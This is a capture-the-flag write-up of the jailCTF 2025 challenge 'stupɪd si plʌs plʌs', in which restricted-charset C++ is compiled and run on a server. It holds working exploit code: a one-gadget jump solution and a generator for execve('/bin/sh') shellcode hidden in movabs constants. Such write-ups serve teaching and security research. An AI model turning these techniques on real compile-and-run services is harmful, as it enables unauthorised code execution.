---
path: /posts/2025-10-08-jailctf-2025-stupidcplusplus
title: jailCTF 2025 - 'stupɪd si plʌs plʌs
date: 2025-10-08
tags: ctf,writeup,pwn
---

[jailCTF](https://pyjail.club) ran over the weekend (plus Monday) and was very fun. I played on team `hashkitten fan club` (aka 🤬🇫🇷🛹🐻) which consisted of a few people from [skateboarding dog](https://twitter.com/sk8boardingdog), [FrenchRoomba](https://twitter.com/frenchroomba), [Emu Exploit](https://twitter.com/emuexploit) and [Cybears](https://twitter.com/cybearsctf). After a tough competition, we won 1st place, thanks to my teammates carrying :)

This is a writeup of `'stupɪd si plʌs plʌs` which was an interesting C++/pwn challenge that I solved alongside a few teammates.

# Challenge Overview

> speak the flag into stdout
>
> nc challs2.pyjail.club 23030
>
> Authors: @oh_word, @quasarobizzaro

```dockerfile
FROM python@sha256:4d440b214e447deddc0a94de23a3d97d28dfafdf125a8b4bb8073381510c9ee2 AS app
RUN apt-get update && apt-get install g++ gdb binutils binutils-gold --yes

FROM pwn.red/jail
COPY --from=app / /srv
COPY --chmod=755 chall.py /srv/app/run
COPY --chmod=444 flag.txt /srv/app/flag.txt
RUN mv /srv/app/flag.txt /srv/flag-$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 32).txt
ENV JAIL_MEM=100M JAIL_PIDS=14 JAIL_TIME=60 JAIL_CONNS_PER_IP=2 JAIL_CPU=150 JAIL_TMP_SIZE=10M
```

```py
#!/usr/local/bin/python3 -u
import os
import subprocess
import tempfile
import re

print("go ham or go home")
code = input("> ")

if not re.fullmatch(r'[a-z *;_]+', code):
    print("u bad")
    exit(1)

with tempfile.TemporaryDirectory() as td:
    src_path = os.path.join(td, "source.cpp")
    compiled_path = os.path.join(td, "compiled")
    with open(src_path, "w") as file:
        file.write('int main() {\n' + code + '\n}\n')
   
    returncode = subprocess.call(["g++", "-B/usr/bin", "-o", compiled_path, src_path], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

    if returncode != 0:
        print("Oops, there were some compilation errors!")
        exit(1)

    print("lets do it")
    subprocess.call([compiled_path])
    print('it is done')
```

In the challenge, we provide some C++ source that can only contain lowercase letters, space, `*`, `;`, and `_`. This is used within the body of the `main` function which is declared with no arguments. The source code file is compiled with `g++`, with any stdout/stderr being suppressed. If compilation succeeded (exit code `0`), the compiled binary is executed! Since the flag is in a random location, we likely need code execution to solve the challenge.

# Solution

## Building Blocks

With a very basic understanding of C/C++, it is obvious we can do at least the following things under the charset restriction:

- Write multiple C++ statements (terminated by `;`)
- Declare variables with lowercase and underscore types (and pointer types) and identifiers (e.g. `int x;` and `int* p;`)
- Perform multiplication with the multiplication operator `*`
- Dereference pointers using the dereference operator (also `*`)

Some observations which are maybe less obvious, but useful for making progress:

- We can also use any [C++ keyword](https://en.cppreference.com/w/cpp/keywords.html) which includes some very useful things like the bit operator `xor` which is equivalent to `^`, and `xor_eq` which is equivalent to `^=`. This allows us to assign values to variables
- There are some predefined macros available provided by `g++`. We can find these with the command below, which reveals macros we could potentially use to get numbers
```sh
$ g++ -dM -E -x c++ - < /dev/null | awk '$2 ~ /^[a-z_]+$/'
...
#define __pic__ 2
...
#define __linux__ 1
...
```
- We can get some values from libc by simply declaring symbols with `extern` (e.g. `extern long stdout;`)
- We can maybe get address leaks from uninitialised stack variables (although we didn't end up using this)
- Although we may not be able to call functions (parentheses are disallowed), we can control RIP for free! This is achieved by using the `goto` keyword, e.g. `goto *x;` for some pointer value `x`

## First Idea: `goto *one_gadget;`

The above building blocks already give us a lot to work with. We have variables, bit operations, multiplication, pointer dereferencing, libc addresses, and RIP control. The first idea we had was to simply try jump to a one gadget in libc:

```
0x4c139 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x60 is writable
  rsp & 0xf == 0
  rax == NULL || {"sh", rax, r12, NULL} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0x4c140 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x60 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, r12, NULL} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0xd515f execve("/bin/sh", rbp-0x40, r13)
constraints:
  address rbp-0x38 is writable
  rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
  [r13] == NULL || r13 == NULL || r13 is a valid envp
```

We could get a libc pointer (e.g. with `extern long stdout; long one_gadget xor_eq stdout;`), then perform some bit arithmetic on it (e.g. with `xor_eq`) with numbers and then hopefully get a shell by jumping to it (with `goto`).

Since we'll need numbers to do the arithmetic effectively, but we can't use digits due to the charset restriction, we need to find some way to get numbers. Let's quickly get that section out of the way.

### Building Numbers

With the two defines for `1` and `2`:

```c
...
#define __pic__ 2
...
#define __linux__ 1
...
```

along with multiplication and the keywords `xor_eq` (`^=`) and `or_eq` (`|=`), we can build arbitrary numbers into variables. We start by building every power of two using multiplication:

```c
    unsigned long two_zero; // 2^0 = 1
    two_zero xor_eq two_zero;
    two_zero or_eq __linux__;

    unsigned long two_one; // 2^1 = 2
    two_one xor_eq two_one;
    two_one or_eq __pic__;

    unsigned long two_two; // 2^2 = 2^1 * 2
    two_two xor_eq two_two;
    two_two or_eq two_one * two_one;

    unsigned long two_three; // 2^3 = 2^2 * 2
    two_three xor_eq two_three;
    two_three or_eq two_two * two_one;

    // ...

    unsigned long two_sixty_three; // 2^63 = 2^62 * 2
    two_sixty_three xor_eq two_sixty_three;
    two_sixty_three or_eq two_sixty_two * two_one;
```

From here, arbitrary numbers can be built by just using `or_eq` (or `xor_eq`) to build up the number's bits. e.g.:

```c
    // x = 0x4141414142424242
    // = 2^62 + 2^56 + 2^54
    // + 2^48 + 2^46 + 2^40
    // + 2^38 + 2^32 + 2^30
    // + 2^25 + 2^22 + 2^17
    // + 2^14 + 2^9 + 2^6 + 2^1
    unsigned long x;
    x xor_eq x;
    x or_eq two_sixty_two;
    x or_eq two_fifty_six;
    x or_eq two_fifty_four;
    x or_eq two_forty_eight;
    x or_eq two_forty_six;
    x or_eq two_forty;
    x or_eq two_thirty_eight;
    x or_eq two_thirty_two;
    x or_eq two_thirty;
    x or_eq two_twenty_five;
    x or_eq two_twenty_two;
    x or_eq two_seventeen;
    x or_eq two_fourteen;
    x or_eq two_nine;
    x or_eq two_six;
    x or_eq two_one;
```

### Almost Winning

So we have numbers and we have a libc address. All we need to do at this point is perform the arithmetic and jump to the one gadget. Unfortunately this didn't work so well for us because we didn't find a way to clear the registers to satisfy the conditions needed for the one gadget to work. We also played around with just trying to call `system("/bin/sh");`, but also had the issue that we didn't find a way to get control over `$rdi`.

We ended up abandoning this idea in favour of our final approach, but it turns out this was the intended solution, except with the additional observation that you can use the `register` keyword to force variables to be stored in a register, which will help to make the one gadget's conditions satisfied. With this, our almost solution turns into an actual solution:

```cpp
int main() {
    unsigned long two_zero;
    two_zero xor_eq two_zero;
    two_zero or_eq __linux__;

    unsigned long two_one;
    two_one xor_eq two_one;
    two_one or_eq __pic__;

    unsigned long two_two;
    two_two xor_eq two_two;
    two_two or_eq two_one * two_one;

    unsigned long two_three;
    two_three xor_eq two_three;
    two_three or_eq two_two * two_one;

    unsigned long two_four;
    two_four xor_eq two_four;
    two_four or_eq two_three * two_one;

    unsigned long two_five;
    two_five xor_eq two_five;
    two_five or_eq two_four * two_one;

    unsigned long two_six;
    two_six xor_eq two_six;
    two_six or_eq two_five * two_one;

    unsigned long two_seven;
    two_seven xor_eq two_seven;
    two_seven or_eq two_six * two_one;

    unsigned long two_eight;
    two_eight xor_eq two_eight;
    two_eight or_eq two_seven * two_one;

    unsigned long two_nine;
    two_nine xor_eq two_nine;
    two_nine or_eq two_eight * two_one;

    unsigned long two_ten;
    two_ten xor_eq two_ten;
    two_ten or_eq two_nine * two_one;

    unsigned long two_eleven;
    two_eleven xor_eq two_eleven;
    two_eleven or_eq two_ten * two_one;

    unsigned long two_twelve;
    two_twelve xor_eq two_twelve;
    two_twelve or_eq two_eleven * two_one;

    unsigned long two_thirteen;
    two_thirteen xor_eq two_thirteen;
    two_thirteen or_eq two_twelve * two_one;

    unsigned long two_fourteen;
    two_fourteen xor_eq two_fourteen;
    two_fourteen or_eq two_thirteen * two_one;

    unsigned long two_fifteen;
    two_fifteen xor_eq two_fifteen;
    two_fifteen or_eq two_fourteen * two_one;

    unsigned long two_sixteen;
    two_sixteen xor_eq two_sixteen;
    two_sixteen or_eq two_fifteen * two_one;

    unsigned long two_seventeen;
    two_seventeen xor_eq two_seventeen;
    two_seventeen or_eq two_sixteen * two_one;

    unsigned long two_eighteen;
    two_eighteen xor_eq two_eighteen;
    two_eighteen or_eq two_seventeen * two_one;

    unsigned long two_nineteen;
    two_nineteen xor_eq two_nineteen;
    two_nineteen or_eq two_eighteen * two_one;

    unsigned long two_twenty;
    two_twenty xor_eq two_twenty;
    two_twenty or_eq two_nineteen * two_one;

    unsigned long two_twenty_one;
    two_twenty_one xor_eq two_twenty_one;
    two_twenty_one or_eq two_twenty * two_one;

    unsigned long two_twenty_two;
    two_twenty_two xor_eq two_twenty_two;
    two_twenty_two or_eq two_twenty_one * two_one;

    unsigned long two_twenty_three;
    two_twenty_three xor_eq two_twenty_three;
    two_twenty_three or_eq two_twenty_two * two_one;

    unsigned long two_twenty_four;
    two_twenty_four xor_eq two_twenty_four;
    two_twenty_four or_eq two_twenty_three * two_one;

    unsigned long two_twenty_five;
    two_twenty_five xor_eq two_twenty_five;
    two_twenty_five or_eq two_twenty_four * two_one;

    unsigned long two_twenty_six;
    two_twenty_six xor_eq two_twenty_six;
    two_twenty_six or_eq two_twenty_five * two_one;

    unsigned long two_twenty_seven;
    two_twenty_seven xor_eq two_twenty_seven;
    two_twenty_seven or_eq two_twenty_six * two_one;

    unsigned long two_twenty_eight;
    two_twenty_eight xor_eq two_twenty_eight;
    two_twenty_eight or_eq two_twenty_seven * two_one;

    unsigned long two_twenty_nine;
    two_twenty_nine xor_eq two_twenty_nine;
    two_twenty_nine or_eq two_twenty_eight * two_one;

    unsigned long two_thirty;
    two_thirty xor_eq two_thirty;
    two_thirty or_eq two_twenty_nine * two_one;

    unsigned long two_thirty_one;
    two_thirty_one xor_eq two_thirty_one;
    two_thirty_one or_eq two_thirty * two_one;

    unsigned long two_thirty_two;
    two_thirty_two xor_eq two_thirty_two;
    two_thirty_two or_eq two_thirty_one * two_one;

    unsigned long two_thirty_three;
    two_thirty_three xor_eq two_thirty_three;
    two_thirty_three or_eq two_thirty_two * two_one;

    unsigned long two_thirty_four;
    two_thirty_four xor_eq two_thirty_four;
    two_thirty_four or_eq two_thirty_three * two_one;

    unsigned long two_thirty_five;
    two_thirty_five xor_eq two_thirty_five;
    two_thirty_five or_eq two_thirty_four * two_one;

    unsigned long two_thirty_six;
    two_thirty_six xor_eq two_thirty_six;
    two_thirty_six or_eq two_thirty_five * two_one;

    unsigned long two_thirty_seven;
    two_thirty_seven xor_eq two_thirty_seven;
    two_thirty_seven or_eq two_thirty_six * two_one;

    unsigned long two_thirty_eight;
    two_thirty_eight xor_eq two_thirty_eight;
    two_thirty_eight or_eq two_thirty_seven * two_one;

    unsigned long two_thirty_nine;
    two_thirty_nine xor_eq two_thirty_nine;
    two_thirty_nine or_eq two_thirty_eight * two_one;

    unsigned long two_forty;
    two_forty xor_eq two_forty;
    two_forty or_eq two_thirty_nine * two_one;

    unsigned long two_forty_one;
    two_forty_one xor_eq two_forty_one;
    two_forty_one or_eq two_forty * two_one;

    unsigned long two_forty_two;
    two_forty_two xor_eq two_forty_two;
    two_forty_two or_eq two_forty_one * two_one;

    unsigned long two_forty_three;
    two_forty_three xor_eq two_forty_three;
    two_forty_three or_eq two_forty_two * two_one;

    unsigned long two_forty_four;
    two_forty_four xor_eq two_forty_four;
    two_forty_four or_eq two_forty_three * two_one;

    unsigned long two_forty_five;
    two_forty_five xor_eq two_forty_five;
    two_forty_five or_eq two_forty_four * two_one;

    unsigned long two_forty_six;
    two_forty_six xor_eq two_forty_six;
    two_forty_six or_eq two_forty_five * two_one;

    unsigned long two_forty_seven;
    two_forty_seven xor_eq two_forty_seven;
    two_forty_seven or_eq two_forty_six * two_one;

    unsigned long two_forty_eight;
    two_forty_eight xor_eq two_forty_eight;
    two_forty_eight or_eq two_forty_seven * two_one;

    unsigned long two_forty_nine;
    two_forty_nine xor_eq two_forty_nine;
    two_forty_nine or_eq two_forty_eight * two_one;

    unsigned long two_fifty;
    two_fifty xor_eq two_fifty;
    two_fifty or_eq two_forty_nine * two_one;

    unsigned long two_fifty_one;
    two_fifty_one xor_eq two_fifty_one;
    two_fifty_one or_eq two_fifty * two_one;

    unsigned long two_fifty_two;
    two_fifty_two xor_eq two_fifty_two;
    two_fifty_two or_eq two_fifty_one * two_one;

    unsigned long two_fifty_three;
    two_fifty_three xor_eq two_fifty_three;
    two_fifty_three or_eq two_fifty_two * two_one;

    unsigned long two_fifty_four;
    two_fifty_four xor_eq two_fifty_four;
    two_fifty_four or_eq two_fifty_three * two_one;

    unsigned long two_fifty_five;
    two_fifty_five xor_eq two_fifty_five;
    two_fifty_five or_eq two_fifty_four * two_one;

    unsigned long two_fifty_six;
    two_fifty_six xor_eq two_fifty_six;
    two_fifty_six or_eq two_fifty_five * two_one;

    unsigned long two_fifty_seven;
    two_fifty_seven xor_eq two_fifty_seven;
    two_fifty_seven or_eq two_fifty_six * two_one;

    unsigned long two_fifty_eight;
    two_fifty_eight xor_eq two_fifty_eight;
    two_fifty_eight or_eq two_fifty_seven * two_one;

    unsigned long two_fifty_nine;
    two_fifty_nine xor_eq two_fifty_nine;
    two_fifty_nine or_eq two_fifty_eight * two_one;

    unsigned long two_sixty;
    two_sixty xor_eq two_sixty;
    two_sixty or_eq two_fifty_nine * two_one;

    unsigned long two_sixty_one;
    two_sixty_one xor_eq two_sixty_one;
    two_sixty_one or_eq two_sixty * two_one;

    unsigned long two_sixty_two;
    two_sixty_two xor_eq two_sixty_two;
    two_sixty_two or_eq two_sixty_one * two_one;

    unsigned long two_sixty_three;
    two_sixty_three xor_eq two_sixty_three;
    two_sixty_three or_eq two_sixty_two * two_one;

    unsigned long x;
    x xor_eq x;
    x or_eq two_twenty;
    x or_eq two_fourteen;
    x or_eq two_thirteen;
    x or_eq two_twelve;
    x or_eq two_ten;
    x or_eq two_nine;
    x or_eq two_eight;
    x or_eq two_four;
    x or_eq two_two;
    x or_eq two_one;
    x or_eq two_zero;

    register unsigned long zero;
    zero xor_eq zero;
    register unsigned long zeroo;
    zeroo xor_eq zeroo;
    register unsigned long zerooo;
    zerooo xor_eq zerooo;
    register unsigned long zeroooo;
    zeroooo xor_eq zeroooo;
    register unsigned long zerooooo;
    zerooooo xor_eq zerooooo;
    register unsigned long zeroooooo;
    zeroooooo xor_eq zeroooooo;
    register unsigned long zerooooooo;
    zerooooooo xor_eq zerooooooo;

    extern unsigned long stdout;
    unsigned long one_gadget;
    one_gadget xor_eq one_gadget;
    one_gadget xor_eq stdout;
    one_gadget xor_eq x;
    one_gadget xor_eq zero;
    one_gadget xor_eq zeroo;
    one_gadget xor_eq zerooo;
    one_gadget xor_eq zeroooo;
    one_gadget xor_eq zerooooo;
    one_gadget xor_eq zeroooooo;
    one_gadget xor_eq zerooooooo;

    goto *one_gadget;
}
```

## Second Idea: `goto *shellcode;`

After failing with the one gadget idea, we came up with another idea which ended up being our actual solve during the CTF. It is easiest to explain with some snippets. Consider a program like this:

```cpp
int main() {
    long x = 0x9090909090909090;
}
```

If we just jump to `0x112f`, we would be executing the `nop` instructions that we encoded in the constant value:

```
gef> disas main
Dump of assembler code for function main:
   0x0000000000001129 <+0>:	push   rbp
   0x000000000000112a <+1>:	mov    rbp,rsp
   0x000000000000112d <+4>:	movabs rax,0x9090909090909090
   0x0000000000001137 <+14>:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000000113b <+18>:	mov    eax,0x0
   0x0000000000001140 <+23>:	pop    rbp
   0x0000000000001141 <+24>:	ret
End of assembler dump.
gef> x/8i 0x112d+2
   0x112f <main+6>:	nop
   0x1130 <main+7>:	nop
   0x1131 <main+8>:	nop
   0x1132 <main+9>:	nop
   0x1133 <main+10>:	nop
   0x1134 <main+11>:	nop
   0x1135 <main+12>:	nop
   0x1136 <main+13>:	nop
```

The crux of the idea is that we can encode shellcode bytes into instruction operands, and then jump to an offset within the `main` function to execute those shellcode bytes. This works thanks to x86-64 instruction encodings being variable length and there being nothing stopping us from jumping mid way into bytes within executable regions. The easiest way to achieve this is with a `movabs` instruction that takes a 64-bit constant operand, which we can get the compiler to emit with a constant assignment statement (just like the above snippets). We would only get 8 bytes worth of instructions at a time, but this is sufficient to do a single small instruction and then a small jump (`eb XX`) to the next 8 bytes.

### More Building Blocks

To get going with our idea, we needed a way to get the address of the binary. We can't use `main` since we can't cast types. Fortunately, there are some symbols we can `extern` which give us precisely what we want - linker symbols. Linker generated symbols can be found via `ld --verbose`. Initially, symbols like `__executable_start` and `_etext` looked promising, however trying to use them gave us undesirable results:

```cpp
#include <stdio.h>
int main() {
    extern long __executable_start;
    extern long _etext;
    printf("%p\n", __executable_start);
    printf("%p\n", _etext);
}

/*
0x10102464c457f
(nil)
*/
```

Their values were the values at the address they represent, and not the addresses themselves. This could be fixed by declaring them as arrays instead:

```cpp
#include <stdio.h>
int main() {
    extern long __executable_start[];
    extern long _etext[];
    printf("%p\n", __executable_start);
    printf("%p\n", _etext);
}

/*
0x555555554000
0x555555555189
*/
```

However, we can't use `[]` due to the charset restriction. To solve this issue, we looked through `ld --verbose` again and found `__init_array_start` which is an array that holds pointers, the first of which is a binary address!

```cpp
#include <stdio.h>
int main() {
    extern long __init_array_start;
    printf("%p\n",__init_array_start);
}
/*
0x555555555130
*/
```

With this, we can easily find where our `main` function is and where our shellcode will be placed.

### Building Inlined Numbers

The issue with our original idea for building numbers was that it actually compiled into `mov` and `or` instructions, instead of optimising into the constant value it represents. This conflicts with our idea for encoding shellcode in number assignments (which compile to `movabs` instructions with the 8 byte operand) since that requires the actual bytes to be in the compiled binary...

Of course, a lot of what we did in the original approach was actually redundant. Instead of building all the powers of 2 first, we can just inline all the multiplication and xor operations because multiplication has higher precedence than xor! For example, to build `0x1337`:

```cpp
#include <stdio.h>
int main() {
    unsigned long x;
    x xor_eq x;
    x xor_eq __pic__ * __pic__ * __pic__ * __pic__ * __pic__ * __pic__ * __pic__ * __pic__ * __pic__ * __pic__ * __pic__ * __pic__ xor __pic__ * __pic__ * __pic__ * __pic__ * __pic__ * __pic__ * __pic__ * __pic__ * __pic__ xor __pic__ * __pic__ * __pic__ * __pic__ * __pic__ * __pic__ * __pic__ * __pic__ xor __pic__ * __pic__ * __pic__ * __pic__ * __pic__ xor __pic__ * __pic__ * __pic__ * __pic__ xor __pic__ * __pic__ xor __pic__ xor __linux__;
    printf("%lx\n", x);
}
```

which is basically

```
x = (2 * 2 * 2 * 2 * 2 * 2 * 2 * 2 * 2 * 2 * 2 * 2) xor (2 * 2 * 2 * 2 * 2 * 2 * 2 * 2 * 2) xor (2 * 2 * 2 * 2 * 2 * 2 * 2 * 2) xor (2 * 2 * 2 * 2 * 2) xor (2 * 2 * 2 * 2) xor (2 * 2) xor (2) xor (1)
x = 2^12 xor 2^9 xor 2^8 xor 2^5 xor 2^4 xor 2^2 xor 2^1 xor 2^0
x = 0x1337
```

This kind of works, and we get something closer to a controlled value as an instruction operand:

```asm
xor    QWORD PTR [rbp-0x8],0x1337
```

Unfortunately, this has another issue - the type of the right hand side of the assignment is an `int`. This means we won't be able to get more than 32 bits in the operand. This would be hard to work with our jumping shellcode...

Fortunately, we had thought about the `sizeof` keyword before and it turned out to be useful now! The result of a `sizeof` expression is a `size_t`, which is an `unsigned long` on 64-bit systems, so this should let us get 64-bit numbers. We can simply replace `__linux__` with `sizeof c` and `__pic__` with `sizeof s`, where we declare `char c;` and `short s;`!

```cpp
#include <stdio.h>
int main() {
    char c;
    short s;
    unsigned long x;
    x xor_eq x;
    x xor_eq sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s xor sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s xor sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s xor sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s xor sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s xor sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s xor sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s xor sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s xor sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s xor sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s xor sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s xor sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s xor sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s xor sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s xor sizeof s * sizeof s * sizeof s * sizeof s * sizeof s * sizeof s xor sizeof s;
    printf("%lx\n", x);
}
```

Doing this, the compiler kindly folds these constants and gives us our `movabs` instruction with the desired operand:

```
movabs rax,0x4141414142424242
```

Yay!

## Jumping Shellcode

This part is fairly straightforward - we just use standard shellcode to `execve` `"/bin/sh"` one instruction at a time (must fit within 6 bytes), padding with NOPs where necessary, and then using two bytes for a `jmp $+8`:

```py
from pwn import *
context.arch = "amd64"

binsh = b"/bin/sh\x00"[::-1]

def pad_and_jump(s):
    s = asm(s)
    l = s + b'\x90' * (6-len(s)) + asm('jmp $+8')
    print(f'0x' + l[::-1].hex())
    return l

sc = b""

for i in range(4):
    b1 = binsh[2*i]
    b2 = binsh[2*i+1]
    sc += pad_and_jump(f"mov bx, 0x{bytes([b1,b2]).hex()}")

    # avoid having the exact same 64-bit value to prevent
    # compiler from optimising them out
    if i == 0:
        sc += pad_and_jump("shl rbx, 0x10\nxor eax, eax")
    elif i == 1:
        sc += pad_and_jump("shl rbx, 0x10\nxor ecx, ecx")
    elif i == 2:
        sc += pad_and_jump("shl rbx, 0x10\nxor edx, edx")

lines = """push rbx
xor rax, rax
mov al, 0x3b
xor rdx, rdx
xor rsi, rsi
mov rdi, rsp
syscall"""
for l in lines.splitlines():
    sc += pad_and_jump(l)

print(disasm(sc))
```

### Actually Winning

The final `source.cpp` is about 125KB, so I'll omit it here, but it basically just looks like this:

```cpp
int main () {
    unsigned char c;
    unsigned short s;

    // SHELLCODE_ASSIGNMENTS

    extern long __init_array_start;
    long sc;
    sc xor_eq __init_array_start;
    sc xor_eq sizeof s * sizeof s * sizeof s * sizeof s xor sizeof s xor sizeof c;

    goto *sc;
}
```

where `// SHELLCODE_ASSIGNMENTS` is replaced with the output of:

```py
words = { 0: "zero", 1: "one", 2: "two", 3: "three", 4: "four", 5: "five", 6: "six", 7: "seven", 8: "eight", 9: "nine", 10: "ten", 11: "eleven", 12: "twelve", 13: "thirteen" }

def gen_pow2(power):
    if power == 0:
        return "sizeof c"
    return " * ".join(["sizeof s"] * power)

def gen_num(target):
    parts = []
    for i in range(63, -1, -1):
        if (target >> i) & 1:
            parts.append(gen_pow2(i))
    return " xor ".join(parts)

TARGETS = [
    0x06EB90900068BB66,
    0x06EBC03110E3C148,
    0x06EB9090732FBB66,
    0x06EBC93110E3C148,
    0x06EB90906E69BB66,
    0x06EBD23110E3C148,
    0x06EB9090622FBB66,
    0x06EB909090909053,
    0x06EB909090C03148,
    0x06EB909090903BB0,
    0x06EB909090D23148,
    0x06EB909090F63148,
    0x06EB909090E78948,
    0x06EB90909090050F,
]
for i, t in enumerate(TARGETS):
    print(f"unsigned long x_{words[i]}; x_{words[i]} xor_eq {gen_num(t)};")
```

This produces 

```py
Dump of assembler code for function main:
   0x0000000000001129 <+0>:	push   rbp
   0x000000000000112a <+1>:	mov    rbp,rsp
   0x000000000000112d <+4>:	sub    rsp,0x8
   0x0000000000001131 <+8>:	movabs rax,0x6eb90900068bb66
   0x000000000000113b <+18>:	xor    QWORD PTR [rbp-0x8],rax
   0x000000000000113f <+22>:	movabs rax,0x6ebc03110e3c148
   0x0000000000001149 <+32>:	xor    QWORD PTR [rbp-0x10],rax
   0x000000000000114d <+36>:	movabs rax,0x6eb9090732fbb66
   0x0000000000001157 <+46>:	xor    QWORD PTR [rbp-0x18],rax
   0x000000000000115b <+50>:	movabs rax,0x6ebc93110e3c148
   0x0000000000001165 <+60>:	xor    QWORD PTR [rbp-0x20],rax
   0x0000000000001169 <+64>:	movabs rax,0x6eb90906e69bb66
   0x0000000000001173 <+74>:	xor    QWORD PTR [rbp-0x28],rax
   0x0000000000001177 <+78>:	movabs rax,0x6ebd23110e3c148
   0x0000000000001181 <+88>:	xor    QWORD PTR [rbp-0x30],rax
